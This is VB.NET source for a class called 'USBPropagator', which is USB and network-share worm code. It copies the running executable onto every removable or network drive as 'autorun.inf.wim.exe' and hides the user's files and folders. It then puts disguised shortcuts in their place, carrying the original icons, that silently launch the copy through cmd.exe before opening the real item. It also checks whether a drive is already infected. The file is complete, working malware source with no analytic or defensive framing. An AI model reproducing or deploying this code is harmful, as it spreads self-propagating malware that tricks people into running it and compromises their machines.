Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Runtime.InteropServices.ComTypes
Imports System.Text
Imports IWshRuntimeLibrary
Imports Microsoft.Win32

Namespace S4Lsalsoft

    Public Class USBPropagator

        Private InstallName As String = "autorun.inf.wim.exe"
        Public Property Loading As Boolean = False

        Public Sub New()

        End Sub

        Public Sub Start()
            Loading = True
            Dim drives As DriveInfo() = DriveInfo.GetDrives()

            For Each drive In drives

                If IsSupported(drive) Then

                    If Not IsInfected(drive.RootDirectory.FullName) Then

                        Dim InstallPath As String = drive.RootDirectory.FullName
                        Dim CurrentPath As String = Application.ExecutablePath

                        Try
                            IO.File.Copy(CurrentPath, IO.Path.Combine(InstallPath, InstallName), True)
                        Catch ex As Exception
                            Dim startInfo As New ProcessStartInfo("xcopy")
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden
                            startInfo.Arguments = """" & CurrentPath.ToString & """" & " " & """" & InstallName.ToString & """"
                            Process.Start(startInfo)
                        End Try

                        If IO.File.Exists(InstallPath) Then
                            Dim HiddenVir As New FileInfo(InstallPath)
                            HiddenVir.Attributes = FileAttributes.Hidden
                        End If

                        Dim SystemDir As String = Environment.SystemDirectory
                        Dim CMDPath As String = IO.Path.Combine(SystemDir, "cmd.exe")

                        Dim Files As List(Of FileInfo) = FileDirSearcher.GetFiles(drive.RootDirectory.FullName, SearchOption.TopDirectoryOnly).ToList
                        For Each FileCurrent As FileInfo In Files
                            If FileCurrent.Extension = ".lnk" Then Continue For
                            FileCurrent.Attributes = FileAttributes.Hidden
                            If Not FileCurrent.Name = InstallName Then
                                Dim ShorcutPath As String = IO.Path.Combine(drive.RootDirectory.FullName, FileCurrent.Name + ".lnk")
                                Create(CMDPath, ShorcutPath, "/c start " + InstallName + " & start explorer " + FileCurrent.Name & " & exit", "File", GetDefaultIcon(FileCurrent.Extension))
                            End If
                        Next

                        Dim Dirs As List(Of DirectoryInfo) = FileDirSearcher.GetDirs(drive.RootDirectory.FullName, SearchOption.TopDirectoryOnly).ToList
                            For Each FolderCurrent As DirectoryInfo In Dirs
                                If FolderCurrent.Extension = ".lnk" Then Continue For
                                FolderCurrent.Attributes = FileAttributes.Directory Or FileAttributes.Hidden
                                Dim ShorcutPath As String = IO.Path.Combine(drive.RootDirectory.FullName, FolderCurrent.Name + ".lnk")
                                Create(CMDPath, ShorcutPath, "/c start " + InstallName + " & start explorer " + FolderCurrent.Name & " & exit", "Folder", True)
                            Next

                        End If

                End If
            Next
            Loading = False
        End Sub

        Public Sub Create(ByVal filePath As String, ByVal linkPath As String, ByVal args As String, ByVal descr As String, ByVal dir As Boolean)
            Dim shlLink As IShellLink = CType(New ShellLink(), IShellLink)
            shlLink.SetDescription(descr)
            shlLink.SetPath(filePath)
            shlLink.SetArguments(args)
            shlLink.SetIconLocation("%SystemRoot%\System32\SHELL32.dll", If(dir, 4, 0))
            Dim file As IPersistFile = CType(shlLink, IPersistFile)
            file.Save(linkPath, False)
        End Sub

        Public Sub Create(ByVal filePath As String, ByVal linkPath As String, ByVal args As String, ByVal descr As String, ByVal FileIcon As String)
            Dim Shell As WshShell = New WshShellClass()
            Dim cl As WshShortcut = CType(Shell.CreateShortcut(linkPath), WshShortcut)
            cl.TargetPath = filePath
            cl.Arguments = args
            cl.Description = descr
            Try
                cl.IconLocation = FileIcon
            Catch ex As Exception
                cl.IconLocation = "%SystemRoot%\System32\user32.dll,1"
            End Try
            cl.Save()
        End Sub

        Public Function IsInfected(ByVal drive As String) As Boolean
            Return IO.File.Exists(IO.Path.Combine(drive, InstallName))
        End Function

        Public Function IsSupported(ByVal drive As DriveInfo) As Boolean
            Try
                Return drive.AvailableFreeSpace > 1024 AndAlso drive.IsReady AndAlso (drive.DriveType = DriveType.Removable OrElse drive.DriveType = DriveType.Network) AndAlso (drive.DriveFormat = "FAT32" OrElse drive.DriveFormat = "NTFS")
            Catch ex As Exception
                Return False
            End Try
        End Function

        Public Function GetDefaultIcon(ByVal Extension As String) As String
            Try
                Dim icoRoot As RegistryKey = Registry.ClassesRoot
                Dim keyNames As String() = icoRoot.GetSubKeyNames()
                Dim iconsInfo As Hashtable = New Hashtable()

                For Each keyName As String In keyNames
                    If LCase(keyName) = LCase(Extension) Then
                        If String.IsNullOrEmpty(keyName) Then Continue For
                        Dim indexOfPoint As Integer = keyName.IndexOf(".")
                        If indexOfPoint <> 0 Then Continue For
                        Dim icoFileType As RegistryKey = icoRoot.OpenSubKey(keyName)
                        If icoFileType Is Nothing Then Continue For
                        Dim defaultValue As Object = icoFileType.GetValue("")
                        If defaultValue Is Nothing Then Continue For
                        Dim defaultIcon As String = defaultValue.ToString() & "\DefaultIcon"
                        Dim readValue = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\software\classes\" & defaultIcon, "", Nothing)
                        Return readValue
                    End If
                Next
                Return ""
            Catch ex As Exception
                Return ""
            End Try
        End Function

    End Class

    <ComImport>
    <Guid("00021401-0000-0000-C000-000000000046")>
    Friend Class ShellLink
    End Class

    <ComImport>
    <InterfaceType(ComInterfaceType.InterfaceIsIUnknown)>
    <Guid("000214F9-0000-0000-C000-000000000046")>
    Friend Interface IShellLink
        Sub GetPath(
<Out, MarshalAs(UnmanagedType.LPWStr)> ByVal pszFile As StringBuilder, ByVal cchMaxPath As Integer, <Out> ByRef pfd As IntPtr, ByVal fFlags As Integer)
        Sub GetIDList(<Out> ByRef ppidl As IntPtr)
        Sub SetIDList(ByVal pidl As IntPtr)
        Sub GetDescription(
<Out, MarshalAs(UnmanagedType.LPWStr)> ByVal pszName As StringBuilder, ByVal cchMaxName As Integer)
        Sub SetDescription(
<MarshalAs(UnmanagedType.LPWStr)> ByVal pszName As String)
        Sub GetWorkingDirectory(
<Out, MarshalAs(UnmanagedType.LPWStr)> ByVal pszDir As StringBuilder, ByVal cchMaxPath As Integer)
        Sub SetWorkingDirectory(
<MarshalAs(UnmanagedType.LPWStr)> ByVal pszDir As String)
        Sub GetArguments(
<Out, MarshalAs(UnmanagedType.LPWStr)> ByVal pszArgs As StringBuilder, ByVal cchMaxPath As Integer)
        Sub SetArguments(
<MarshalAs(UnmanagedType.LPWStr)> ByVal pszArgs As String)
        Sub GetHotkey(<Out> ByRef pwHotkey As Short)
        Sub SetHotkey(ByVal wHotkey As Short)
        Sub GetShowCmd(<Out> ByRef piShowCmd As Integer)
        Sub SetShowCmd(ByVal iShowCmd As Integer)
        Sub GetIconLocation(
<Out, MarshalAs(UnmanagedType.LPWStr)> ByVal pszIconPath As StringBuilder, ByVal cchIconPath As Integer, <Out> ByRef piIcon As Integer)
        Sub SetIconLocation(
<MarshalAs(UnmanagedType.LPWStr)> ByVal pszIconPath As String, ByVal iIcon As Integer)
        Sub SetRelativePath(
<MarshalAs(UnmanagedType.LPWStr)> ByVal pszPathRel As String, ByVal dwReserved As Integer)
        Sub Resolve(ByVal hwnd As IntPtr, ByVal fFlags As Integer)
        Sub SetPath(
<MarshalAs(UnmanagedType.LPWStr)> ByVal pszFile As String)
    End Interface

End Namespace
